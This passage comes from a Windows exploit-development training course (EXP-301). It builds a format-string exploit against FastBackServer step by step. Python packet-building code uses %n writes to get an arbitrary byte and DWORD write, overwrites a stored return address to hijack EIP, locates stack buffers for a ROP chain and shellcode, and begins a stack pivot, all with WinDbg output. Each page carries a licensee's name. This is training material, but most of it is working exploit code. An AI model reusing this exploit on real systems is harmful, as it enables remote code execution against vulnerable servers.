As highlighted in Listing 737, the correct value (0xD8) is indeed used in the write operation, so our 
idea works and we are able to write an arbitrary byte value to an arbitrary memory address. Nice! 
In this section, we explored the limits imposed upon us by the %n specifier for this particular 
vsnprintf call. We learned how to write arbitrary byte values despite these limitations. We’ll 
combine this write primitive with our previous stack leak code to write to the stack in the next 
section. 
12.1.2.1 Exercises 
1. 
Follow the analysis and ensure you understand the algorithm to calculate the width for an 
arbitrary byte value. 
2. 
Update the Python script to perform writes with a byte value through the dynamically-
generated width value. Test it with values both above and below 0xC7. 
12.1.3 
Write to the Stack 
In the previous section, we crossed our first two hurdles by developing an algorithm for the width 
calculation and implementing it in the Python script to allow the write of an arbitrary byte value. 
Our next challenge is to combine the ability to write a byte with our ASLR bypass developed in the 
previous module, enabling us to write a byte to the stack. 
At first glance, this seems fairly simple, since we can insert the write primitive code directly into 
our ASLR-leak Python script after the base address of kernelbase.dll is printed to the console. 
Let’s test our idea by making two changes to the code, both highlighted in Listing 738. First, we’ll 
remove the static A’s and replace them with the leaked stack address, plus an offset of 0x1000. 
We know that the contents of the stack are changed every time a function call is made. This 
means if we write directly to the leaked stack address, the value might be overwritten before we 
can verify it in the debugger. This is why we’ve chosen a large arbitrary offset of 0x1000. 
# psCommandBuffer 
buf += b"w00t:BB" + pack("<i", stackAddr + 0x1000) + b"%x:" * 19 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
579 
buf += b"%" + b"%d" % width + b"x:" 
buf += b"%n" 
buf += b"%x" * 0x6b  
buf += b"B" * 0x100  
buf += b"C" * 0x100  
 
# Padding 
buf += bytearray([0x41]*(0x404-len(buf))) 
 
s.send(buf) 
print("Written " + str(hex(byteValue)) + " to address " + str(hex(stackAddr + 
0x1000))) 
input() 
 
s.close() 
sys.exit(0) 
Listing 739 - Code to write to the stack address 
At the end of the script, we’ll call input to pause execution, allowing us to break in WinDbg and 
examine the contents of the stack address. 
In our example, we will write the byte value 0xD8 as before, and have the address to which it is 
written printed to the console. 
kali@kali:~$ python3 poc.py 192.168.120.10 
The optimal start value is: 0x60dac 
Stack address leaked to event log 
The eventlog returned contains b03 bytes 
The size read is: 0xb03 
Leaked stack address is: 0xd51ded4 
Kernelbase address leaked to event log 
The eventlog returned contains 503 bytes 
The size read is: 0x503 
Leaked Kernelbase address is: 0x745dc36a 
Kernelbase base address is: 0x744d0000 
Written 0xd8 to address 0xd51eed4 
Listing 740 - Executing the write primitive 
Once the byte is written to the stack address, execution pauses, and we can switch to WinDbg 
and break into it. Let’s examine the contents we wrote. 
0:063> dd 0xd51eed4 L1 
0d51eed4  000000dc 
 
0:063> ? dc - d8 
Evaluate expression: 4 = 00000004 
Listing 741 - Examining the stack reveals the wrong value 
As shown in Listing 741, the wrong byte value was written. It is off by four bytes. 
From the previous section, we know that the write primitive works and our algorithm is correct, so 
we need to determine why the byte value is off. 
As is often the case with exploit development, combining or changing code within an exploit can 
have unexpected consequences. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
580 
To investigate this scenario, we’ll execute our previous proof of concept containing only the write 
primitive, and then examine the contents of the stack. 
(2310.b10): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
 
0:063> bp FastBackServer!_output+0x507 
eax=41414141 ebx=0000006e ecx=000000d8 edx=00000200 esi=0d46df4c edi=00000800 
eip=00672f1a esp=0d46d964 ebp=0d46dbbc iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!_output+0x507: 
00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=???????? 
 
0:001> k 
 # ChildEBP RetAddr   
00 0d46dbbc 0066bf8e FastBackServer!_output+0x507 
01 0d46dbf4 0065b14b FastBackServer!_vsnprintf+0x2c 
02 0d46dc0c 004803ff FastBackServer!ml_vsnprintf+0x18 
03 0d46dea4 0048056d FastBackServer!EventLog_wrapted+0x2e2 
... 
Listing 742 - Callstack during vsnprintf 
Now we can dump the contents at the stored return address, which enables us to locate the call 
from ml_vsnprintf and the supplied arguments. We’ll recall that the fourth argument is the 
address of the array containing the contents used with the format specifiers. 
:001> dds 0d46dbbc 
0d46dbbc  0d46dbf4 
0d46dbc0  0066bf8e FastBackServer!_vsnprintf+0x2c 
... 
0d46dbf8  0065b14b FastBackServer!ml_vsnprintf+0x18 
0d46dbfc  0d46dca5 
0d46dc00  000001c7 
0d46dc04  0d46ded4 
0d46dc08  0d46deb8 
0d46dc0c  0d46dea4 
... 
Listing 743 - Fourth argument for vsnprintf 
The array of arguments used with the format specifiers is given in Listing 744. We should keep in 
mind that we don’t control the first seven values. 
0:001> dc 0d46deb8 
0d46deb8  000000c4 0d46ded4 00000025 00000078  ......F.%...x... 
0d46dec8  0000012e 00000025 00000000 5f494741  ....%.......AGI_ 
0d46ded8  65475f53 65674174 6953746e 74616e67  S_GetAgentSignat 
0d46dee8  3a657275 756f6320 276e646c 69662074  ure: couldn't fi 
0d46def8  6120646e 746e6567 30307720 42423a74  nd agent w00t:BB 
0d46df08  41414141 253a7825 78253a78 3a78253a  AAAA%x:%x:%x:%x: 
0d46df18  253a7825 78253a78 3a78253a 253a7825  %x:%x:%x:%x:%x:% 
0d46df28  78253a78 3a78253a 253a7825 78253a78  x:%x:%x:%x:%x:%x 
Listing 744 - Contents of argument array during standalone 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
581 
The discrepancy in size must be due to the number of values written to the target address before 
the %n specifier is reached. 
Keeping in mind that the %n specifier only counts the number of values, we know that our 
algorithm will be off if the number of digits in any of the first seven values, which we do not 
control, changes. 
As an example, the value contained in the first DWORD is currently 0xc4. When 0xc4 is processed 
by vsnprintf, the %x format specifier is used, which means two digits are written to the formatted 
string. 
If the first DWORD were to change from 0xc4 to 0x1c4, it would result in 3 digits when formatted 
by vsnprintf, which in turn leads to an increase in the value returned through the %n specifier. 
Let’s determine if an instability exists, and if it does, figure out a way to solve it. 
Let’s begin by restarting FastBackServer, attaching WinDbg, setting a breakpoint at the location of 
our access violation (FastBackServer!_output+0x507), and then executing our Python script, 
which includes both the ASLR leak and the write primitive. 
When the breakpoint is encountered, we’ll follow the same dereference chain to locate the 
contents of the arguments array, as shown in Listing 745. 
0:080> dc 0db2deb8 L28 
0db2deb8  000000c4 0db2ded4 00000025 00000078  ........%...x... 
0db2dec8  0000012e 001afd25 00000000 5f494741  ....%.......AGI_ 
0db2ded8  65475f53 65674174 6953746e 74616e67  S_GetAgentSignat 
0db2dee8  3a657275 756f6320 276e646c 69662074  ure: couldn't fi 
0db2def8  6120646e 746e6567 30307720 42423a74  nd agent w00t:BB 
0db2df08  0db2eed4 253a7825 78253a78 3a78253a  ....%x:%x:%x:%x: 
0db2df18  253a7825 78253a78 3a78253a 253a7825  %x:%x:%x:%x:%x:% 
0db2df28  78253a78 3a78253a 253a7825 78253a78  x:%x:%x:%x:%x:%x 
0db2df38  3a78253a 253a7825 78253a78 3532253a  :%x:%x:%x:%x:%25 
0db2df48  6e253a78 78257825 78257825 78257825  x:%n%x%x%x%x%x%x 
Listing 745 - Contents of argument array 
By comparing the contents of the arguments array shown in Listing 745 and the those shown in 
Listing 744, we find that only the dynamic stack address and the sixth value differ. 
The sixth value changed from 0x25 to 0x1afd25. When the new value of 0x1afd25 is processed 
by the %x specifier, it will take up an additional four characters. That means the value returned 
through the %n specifier is increased by 4 when the write primitive is invoked inside the combined 
script. 
These leftover bytes on the stack, likely from a previous vsnprintf call, explain why the value we 
want to write is incorrect when the code is combined. 
The number of characters written to the eventlog has increased from 2 to 6, but we can account 
for the increase by using a width value of “6” with the sixth %x specifier. This will ensure that the 
number of characters written to the event log will always remain constant. However, 
implementing this change will cause another issue. 
Because four extra values are always printed, our algorithm is off. We previously found that we 
can write the values from 0xC7 up to a maximum of 0x1C7, but an increase of 4 to all values will 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
582 
push us over the maximum size. We can account for this by removing four of the colons used to 
separate the %x specifiers. 
... 
# psCommandBuffer 
buf += b"w00t:BB" + pack("<i", stackAddr + 0x1000) 
buf += b"%x" * 5 + b":" 
buf += b"%6x:" 
buf += b"%x:" * 13 
buf += b"%" + b"%d" % width + b"x:" 
buf += b"%n" 
buf += b"%x" * 0x6b  
buf += b"B" * 0x100  
buf += b"C" * 0x100  
... 
Listing 746 - Accounting for the variable size 
The colons are present to make it easier to identify separate values, but they’re irrelevant when 
we invoke the write primitive. 
Let’s remove four of the colons, leaving our algorithm for calculating the width otherwise 
unchanged, and re-test the exploit. 
kali@kali:~$ python3 poc.py 192.168.120.10 
The optimal start value is: 0x617fc 
Stack address leaked to event log 
The eventlog returned contains 1003 bytes 
The size read is: 0x1003 
Leaked stack address is: 0xee5ded4 
Kernelbase address leaked to event log 
The eventlog returned contains 803 bytes 
The size read is: 0x803 
Leaked Kernelbase address is: 0x745dc36a 
Kernelbase base address is: 0x744d0000 
Written 0xd8 to address 0xee5eed4 
Listing 747 - Write a byte to the stack 
After the input function is encountered, we will switch to WinDbg, break into it, and dump the 
contents at the address that we wrote to on the stack. 
0:006> dd 0xee5eed4 L1 
0ee5eed4  000000d8 
Listing 748 - The correct value was written 
Listing 748 shows that this time, the correct value was written to the stack. Excellent! 
We are now one step closer to implementing the complete write primitive. 
12.1.3.1 Exercises 
1. 
Combine the byte write code with the stack leak code and attempt to write a byte value. 
2. 
Repeat the analysis to figure out why the value is off by four. 
3. 
Implement a fix to the code that accounts for the variable content on the stack. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
583 
4. 
What happens if FastBackServer runs for a long time and the stack address goes above 
0x10000000? Ensure that your exploit handles this scenario. 
12.1.4 
Going for a DWORD 
Our work in the previous sections has enabled us to write an arbitrary byte value to a specific 
memory address. Let’s finish the work by combining four byte writes into a full DWORD write. 
We can combine the four byte writes with a for loop, as shown in Listing 749. We’ll use the 
dummy value 0x1234ABCD for testing. 
Since each iteration only handles one byte, the DWORD is split by right-shifting the loop index 
eight times. The stack address we’re writing to is also increased by the index value. 
value = 0x1234ABCD 
 
for index in range(4): 
    byteValue = (value >> (8 * index)) & 0xFF 
    if byteValue > 0xC6: 
      width = byteValue - 0xC7 + 0x8 
    else: 
      width = byteValue + 0x39 + 0x8 
 
    # psAgentCommand 
    buf = pack(">i", 0x400) 
    buf += bytearray([0x41]*0xC) 
    buf += pack("<i", 0x604)  # opcode 
    buf += pack("<i", 0x0)    # 1st memcpy: offset 
    buf += pack("<i", 0x100)  # 1st memcpy: size field 
    buf += pack("<i", 0x100)  # 2nd memcpy: offset 
    buf += pack("<i", 0x100)  # 2nd memcpy: size field 
    buf += pack("<i", 0x200)  # 3rd memcpy: offset 
    buf += pack("<i", 0x100)  # 3rd memcpy: size field 
    buf += bytearray([0x41]*0x8) 
 
    # psCommandBuffer 
buf += b"w00t:BB" + pack("<i", stackAddr + 0x1000 + index) 
    buf += b"%x" * 5 + b":" 
    buf += b"%6x:" 
    buf += b"%x:" * 13 
    buf += b"%" + b"%d" % width + b"x:" 
    buf += b"%n" 
    buf += b"%x" * 0x6b  
    buf += b"B" * 0x100  
    buf += b"C" * 0x100  
 
    # Padding 
    buf += bytearray([0x41]*(0x404-len(buf))) 
 
    s.send(buf) 
 
print("Written " + str(hex(value)) + " to address " + str(hex(stackAddr + 0x1000))) 
input() 
Listing 749 - Four byte writes through a for loop 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
584 
At the end of the code, we’ll print the entire DWORD and the location we wrote it to. 
Let’s execute the Python code and, just before the input call, we’ll find the new address to which 
the value is written. 
kali@kali:~$ python3 poc.py 192.168.120.10 
The optimal start value is: 0x61c1e 
Stack address leaked to event log 
The eventlog returned contains 1103 bytes 
The size read is: 0x1103 
Leaked stack address is: 0xfc5ded4 
Kernelbase address leaked to event log 
The eventlog returned contains 803 bytes 
The size read is: 0x803 
Leaked Kernelbase address is: 0x745dc36a 
Kernelbase base address is: 0x744d0000 
Written 0x1234abcd to address 0xfc5eed4 
Listing 750 - Write a full DWORD to the stack 
With the input call stopping execution, we can switch to WinDbg again and verify if the DWORD 
was written correctly. 
0:006> dd 0xfc5eed4 L1 
0fc5eed4  1234abcd 
Listing 751 - The full DWORD is written to memory 
Here we’ll find the full DWORD, 0x1234ABCD, at the desired address. 
As with most exploits, they are never 100% stable and sometimes the exploit will 
fail to execute all four writes. 
Our hard work with the format string vulnerability has now resulted in the creation of both a read 
and write primitive, enabling us to read from and write to an arbitrary location in memory. These 
are powerful abilities that we can likely apply to achieve code execution. 
12.1.4.1 Exercises 
1. 
Combine four byte writes in a for loop to obtain a full DWORD write, as shown in this section. 
2. 
Implement a writeDWORD function in the Python script to write a value to a given address. 
This will provide us with a more modular approach going forward. 
12.2 Overwriting EIP with Format Strings 
Now that we can write a DWORD anywhere in memory, let’s figure out how to leverage that to 
obtain code execution. 
In the next couple of sections, we’ll focus on gaining control of EIP, which is the first step towards 
code execution. As part of this process, we’ll learn how to locate a return address on the stack. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
585 
12.2.1 
Locating a Target 
In many stack-based vulnerabilities, EIP control is obtained by overwriting content on the stack 
outside of the bounds of a buffer. If we write enough content, we may be able to directly overwrite 
a stored return address on the stack, or perhaps the SEH chain. 
To use our write primitive, let’s find a return address stored on the stack that we can overwrite. 
We can only write one byte at a time, so we need to make sure the return address is not used 
before the entire DWORD has been written. 
Overwriting a return address on the stack is also a common technique for 
bypassing the Control Flow Guard (CFG)394 security mitigation. 
An optimal target will be located far down the call stack. To find possible candidates, let’s set a 
breakpoint on _FastBackServer!output+0x507 where the byte value is written. We can then dump 
and search the stack for addresses that are present. 
0:078> bp FastBackServer!_output+0x507 
 
0:078> g 
Breakpoint 0 hit 
eax=0f4ceed4 ebx=0000006e ecx=00000144 edx=00000200 esi=0f4cdf4a edi=00000800 
eip=00672f1a esp=0f4cd964 ebp=0f4cdbbc iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!_output+0x507: 
00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:0f4ceed4=00000000 
 
0:086> k 
 # ChildEBP RetAddr   
00 0f4cdbbc 0066bf8e FastBackServer!_output+0x507 
01 0f4cdbf4 0065b14b FastBackServer!_vsnprintf+0x2c 
02 0f4cdc0c 004803ff FastBackServer!ml_vsnprintf+0x18 
03 0f4cdea4 0048056d FastBackServer!EventLog_wrapted+0x2e2 
04 0f4ce2d4 0054b6a0 FastBackServer!EventLog+0x13c 
05 0f4ce31c 0056df61 FastBackServer!AGI_S_GetAgentSignature+0xdd 
06 0f52fe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x1aab 
07 0f52feb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130 
08 0f52fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116 
09 0f52ff48 006693e9 FastBackServer!ORABR_Thread+0xef 
0a 0f52ff80 75f19564 FastBackServer!_beginthreadex+0xf4 
0b 0f52ff94 7722293c KERNEL32!BaseThreadInitThunk+0x24 
... 
Listing 752 - Call stack during byte write 
Our initial reverse engineering performed in a previous module determined that when the network 
packet is received, the handler function returns into FX_AGENT_Cyclic, after which the packet is 
processed. 
 
394 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
586 
This means that the entire stack from entry 00 to 09 is modified between each network packet, 
and thus between each byte we write. We also know that the thread terminates when the network 
connection is closed. 
Putting this together, we can overwrite FastBackServer!_beginthreadex+0xf4 on the stack and it 
will be triggered when we call s.close() in our Python script. We also know that nothing in that part 
of the stack will change while our packets are processed. In essence, it is a stable overwrite. 
To find the exact location of the return address on the stack, we can display its contents from 
stack frame 09, as highlighted in the listing below. 
0:086> dds 0f52ff48  
0f52ff48  0f52ff80 
0f52ff4c  006693e9 FastBackServer!_beginthreadex+0xf4 
0f52ff50  0771f6f0 
... 
Listing 753 - Location of return address on the stack 
This is the exact address on the stack we want to overwrite. 
Next, we need to determine the offset from the leaked stack address to the location of the return 
address. The leaked stack address is given in Listing 754. 
kali@kali:~$ python3 poc.py 192.168.120.10 
The optimal start value is: 0x60087 
Stack address leaked to event log 
The eventlog returned contains 3403 bytes 
The size read is: 0x3403 
Leaked stack address is: 0xf4cded4 
Kernelbase address leaked to event log 
The eventlog returned contains 1d03 bytes 
The size read is: 0x1d03 
Leaked Kernelbase address is: 0x745dc36a 
Kernelbase base address is: 0x744d0000 
Listing 754 - Leaked stack address 
We’ve obtained both values, and Listing 755 shows the resulting offset. 
0:086> ? 0f52ff4c - 0xf4cded4 
Evaluate expression: 401528 = 00062078 
Listing 755 - Calculating the offset 
It’s important to ensure that this offset remains constant between restarts of the application and 
exploitation attempts. 
If we restart FastBackServer, attach WinDbg, and execute the Python script with the input 
statement and no breakpoints, we can break into the execution and determine whether the offset 
remains constant. 
0:001> dds 0x114dded4 + 62078 L1 
1153ff4c  006693e9 FastBackServer!_beginthreadex+0xf4 
Listing 756 - Verifying the offset 
From this limited test, we can verify that the offset seems to remain static. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
587 
We have now found a very promising and (hopefully) stable return address on the stack that we 
can overwrite. In the next section, we will try to obtain control of EIP. 
12.2.1.1 Exercises 
1. 
Follow the analysis and verify that the offset is constant. 
2. 
Are there any other viable return addresses? 
12.2.2 
Obtaining EIP Control 
With our target located, we can finally use our write primitive to gain control of EIP. 
In our Python code, we’ll first calculate the location of the return address using the leaked stack 
address and the offset we found in the last section. 
We can invoke our write primitive from a function called writeDWORD (developed in a previous 
exercise). This will make it more modular and the code easier to read. Let’s write the dummy 
value 0x41414141 at the location of the return address. 
print("Kernelbase base address is: " + str(hex(kernelbaseBase))) 
 
returnAddr = stackAddr + 0x62078 
 
print("About to overwrite return address at: " + str(hex(returnAddr))) 
input() 
 
writeDWORD(s, returnAddr, 0x41414141) 
 
print("Return address overwritten") 
input() 
 
s.close() 
sys.exit(0) 
Listing 757 - Code to overwrite return address 
Both prior to the write primitive and following it, we’ll perform a print to the console and pause 
execution, so we can verify that everything is working correctly. 
When the exploit is executed, we can break into WinDbg and check the address we are about to 
overwrite. 
(277c.1d9c): Break instruction exception - code 80000003 (first chance) 
eax=003c1000 ebx=00000000 ecx=77289bc0 edx=77289bc0 esi=77289bc0 edi=77289bc0 
eip=77251430 esp=137fff54 ebp=137fff80 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!DbgBreakPoint: 
77251430 cc              int     3 
 
0:079> dds 0x136fff4c L1 
136fff4c  006693e9 FastBackServer!_beginthreadex+0xf4 
 
0:079> g 
Listing 758 - Checking return address before overwrite 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
588 
After letting execution continue in WinDbg, let’s switch back to the Python script and enter a key 
to let execution continue. 
This will trigger the next call to input, and we now find that the return address has indeed been 
overwritten: 
(277c.f8): Break instruction exception - code 80000003 (first chance) 
eax=003c2000 ebx=00000000 ecx=77289bc0 edx=77289bc0 esi=77289bc0 edi=77289bc0 
eip=77251430 esp=138fff54 ebp=138fff80 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!DbgBreakPoint: 
77251430 cc              int     3 
 
0:079> dds 0x136fff4c L1 
136fff4c  41414141 
 
0:079> g 
Listing 759 - Checking return address after overwrite 
Our write primitive was successful! The return address has been overwritten on the stack. 
Continuing execution in both WinDbg and the Python script closes the network connection, 
triggering the use of the overwritten return address. 
(277c.1b6c): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=00000000 ebx=060eaf60 ecx=136fff70 edx=011208d0 esi=060eaf60 edi=00669360 
eip=41414141 esp=136fff54 ebp=136fff80 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
41414141 ??              ??? 
Listing 760 - We have obtain control of EIP 
EIP is now under our control. Hooray! 
In previous modules, we completely smashed the stack by overwriting out of the bounds of a 
fixed-size buffer. If the application uses stack cookies,395 the cookie itself is also overwritten and 
the application will terminate. 
Our write primitive overwrites with much more precision, bypassing such protections. 
Bypassing ASLR and gaining control of EIP is not the end of the exploitation process. To enable 
shellcode to run, we need to deal with DEP next. 
12.2.2.1 Exercise 
1. 
Use your previous Python script to overwrite the return address on the stack and obtain 
control of EIP. 
 
395 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Buffer_overflow_protection 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
589 
12.3 Locating Storage Space 
Leveraging our ASLR bypass from the previous module, we can use ROP to bypass DEP and 
obtain code execution. 
Sadly, the data we have been working with so far is part of a format string, which is not an 
optimal storage location for a ROP chain or shellcode. 
In the next couple of sections, we will figure out where we can store a ROP chain and shellcode. 
We’ll also need to find a suitable stack pivot gadget. 
12.3.1 
Finding Buffers 
The format string used to create the write primitive cannot contain the ROP chain or shellcode 
because it is interpreted as a character string in multiple locations. We might be able to solve this 
with encoding, but let’s consider an alternative. 
From our initial work reverse engineering psAgentCommand and psCommandBuffer, we know 
that our data is treated as three separate buffers. These three buffers are copied into unique 
stack buffers during initial processing. 
We want to send a last packet with an invalid opcode after the return address has been 
overwritten, then confirm whether the contents of the psCommandBuffers are still present in 
memory, when we gain control of EIP. 
Listing 761 shows the construction of a packet that will contain an opcode value of 0x80, which is 
below the minimum value of 0x100 found in FXCLI_OraBR_Exec_Command. 
print("Sending payload") 
# psAgentCommand 
buf = pack(">i", 0x400) 
buf += bytearray([0x41]*0xC) 
buf += pack("<i", 0x80)  # opcode 
buf += pack("<i", 0x0)    # 1st memcpy: offset 
buf += pack("<i", 0x100)  # 1st memcpy: size field 
buf += pack("<i", 0x100)  # 2nd memcpy: offset 
buf += pack("<i", 0x100)  # 2nd memcpy: size field 
buf += pack("<i", 0x200)  # 3rd memcpy: offset 
buf += pack("<i", 0x100)  # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
 
# psCommandBuffer 
buf += b"DDDDEEEEFFFFGGGGHHHH" 
buf += b"C" * 0x200 
 
# Padding 
buf += bytearray([0x41]*(0x404-len(buf))) 
s.send(buf) 
Listing 761 - Code to send payload packet 
For the content of the first psCommandBuffer, we’ll enter an easily-recognizable buffer that we 
can search for. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
590 
Let’s update and execute the Python script. When the connection closes, EIP is overwritten with 
0x41414141, triggering an access violation as shown in the previous section. At this point, we can 
search the stack for the psCommandBuffer. 
We’ll start by using the !teb command to find the StackBase and StackLimit. 
0:088> !teb 
TEB at 003c0000 
    ExceptionList:        0fc0ff70  
    StackBase:            0fc10000  
    StackLimit:           0fb92000 
    SubSystemTib:         00000000 
... 
 
0:089> ? (0fc10000 - 0fb92000)/4 
Evaluate expression: 129024 = 0001f800 
Listing 762 - Finding the size of the current stack 
After finding the boundaries of the stack, we can calculate the number of DWORDs it requires. 
Searching for a single byte on the stack will likely result in multiple false positive results, but a 
value such as 0x44444444 does not commonly appear. 
We can use s to conduct a DWORD search for the content of the psCommandBuffer, which is why 
we needed to know the amount of DWORDs on the stack. 
0:089> s -d 0fb92000 L?1f800 0x44444444 
0fb95c20  44444444 45454545 46464646 47474747  DDDDEEEEFFFFGGGG 
0fc03b30  44444444 45454545 46464646 47474747  DDDDEEEEFFFFGGGG 
Listing 763 - Searching for the psCommandBuffer 
It seems we’ve successfully located two separate buffers containing our input. While we could 
select either buffer in theory, we should keep bad characters in mind. 
From the experience we have gained throughout this course and by reverse engineering the 
protocol processing of FastBackServer, we know that some copy operations introduce bad 
characters. When strcpy is used, NULL bytes will terminate the string. When sscanf is used, 
multiple characters will become bad characters, including NULL bytes. But when a copy operation 
is performed with memcpy, there are no bad characters. 
Based on this information, if we modify the packet to include one or more NULL bytes, we can 
(hopefully) locate a buffer that is free of bad characters. 
In Listing 764, the value 0x00000200 is appended to the unique string inside the code. 
# psCommandBuffer 
buf += b"DDDDEEEEFFFFGGGGHHHH" 
buf += pack("<i", 0x200) 
buf += b"C" * 0x200 
 
# Padding 
buf += bytearray([0x41]*(0x404-len(buf))) 
s.send(buf) 
Listing 764 - psCommandBuffer contains NULL bytes 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
591 
After restarting FastBackServer, attaching WinDbg, and executing the updated exploit, we’ll again 
trigger the access violation to find the StackBase, StackLimit, and number of DWORDs on the 
stack. 
0:089> !teb 
TEB at 00340000 
    ExceptionList:        0fa7ff70 
    StackBase:            0fa80000 
    StackLimit:           0fa02000 
    SubSystemTib:         00000000 
     
0:089> ? (0fa80000 - 0fa02000)/4 
Evaluate expression: 129024 = 0001f800 
Listing 765 - Finding the size of the current stack 
Next, we’ll repeat the search for the psCommandBuffer. 
0:089> s -d 0fa02000 L?0001f800 0x44444444 
0fa05c20  44444444 45454545 46464646 47474747  DDDDEEEEFFFFGGGG 
0fa73b30  44444444 45454545 46464646 47474747  DDDDEEEEFFFFGGGG 
 
0:089> dd 0fa05c20 LC 
0fa05c20  44444444 45454545 46464646 47474747 
0fa05c30  48484848 43434300 43434343 43434343 
0fa05c40  43434343 43434343 43434343 43434343 
 
0:089> dd 0fa73b30 LC 
0fa73b30  44444444 45454545 46464646 47474747 
0fa73b40  48484848 00000200 43434343 43434343 
0fa73b50  43434343 43434343 43434343 43434343 
Listing 766 - Two copies of psCommandBuffer on the stack 
When we dump the contents of the two instances of the psCommandBuffer on the stack, we’ll 
notice that the first instance does not handle the NULL bytes well. 
The second instance contains exactly the desired content, so we’ll use it going forward. 
If we can reliably locate the buffer in memory, given the leaked stack pointer, it will serve as a 
perfect buffer location for the ROP chain and shellcode. 
Listing 767 shows the console output from running the Python script, giving us the leaked stack 
address. 
kali@kali:~$ python3 poc.py 192.168.120.10 
The optimal start value is: 0x61eae 
Stack address leaked to event log 
The eventlog returned contains 3a03 bytes 
The size read is: 0x3a03 
Leaked stack address is: 0xfa1ded4 
Kernelbase address leaked to event log 
... 
Listing 767 - Leaked stack address from Python script 
We can now calculate the offset between the leaked stack address and the psCommandBuffer. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
592 
0:089> ? 0fa73b30   - 0fa1ded4 
Evaluate expression: 351324 = 00055c5c 
Listing 768 - Offset from stack address to the psCommandBuffer 
Running the exploit multiple times reveals the offset from the leaked stack address to the second 
psCommandBuffer is constant. 
We can reliably use this as our storage buffer. 
In this section, we learned how to craft a final network packet containing a placeholder ROP chain 
and shellcode. Its location inside the psCommandBuffers on the stack is determined from our 
stack address leak. 
Next, we need to determine how to leverage a stack pivot so we can perform a ROP attack. 
12.3.1.1 Exercises 
1. 
Update your code and follow the analysis in this section to locate the psCommandBuffers in 
memory. 
2. 
Include NULL bytes as part of the psCommandBuffer and determine which of the two 
instances handles them correctly. 
3. 
Verify that the offset between the leaked stack pointer and the psCommandBuffer remains 
constant across application restarts. 
12.3.2 
Stack Pivot 
The ROP technique depends on our ability to control the stack. In many vulnerabilities, ESP does 
not automatically point to our ROP chain, so we’ll need to modify it as our first step. 
If we attempt to overwrite EIP when we do not control the stack, we are typically limited to using 
only a single ROP gadget to pivot to the stack, otherwise we’ll lose control of EIP and the 
application crashes. 
Common stack pivot gadgets are “MOV ESP, R32” or “XCHG ESP, R32”, where R32 is any 32-bit 
register. These type of pivot gadgets work if any of the registers contain the address of the buffer 
where we put our ROP chain. 
EIP is overwritten when the network connection closes, which means the execution context will 
not be related to our input buffers. We’ll need to be more creative to execute a stack pivot. 
Because of the stack leak and constant offset value to the psCommandBuffer, we know the 
absolute address of where the return address is stored when we overwrite EIP. 
With this in mind, let’s place two DWORDs on the stack: the address of a “POP ESP; RET;” gadget, 
followed by the absolute stack address of the second psCommandBuffer portion. If we align them 
correctly, the “POP ESP” instruction will pop the address of the psCommandBuffer into ESP and 
return into it immediately, aligning it with the subsequent ROP chain. 
To avoid corrupting the gadget address with our write primitive, we’ll need to write the absolute 
stack address of the second psCommandBuffer portion before the gadget. 
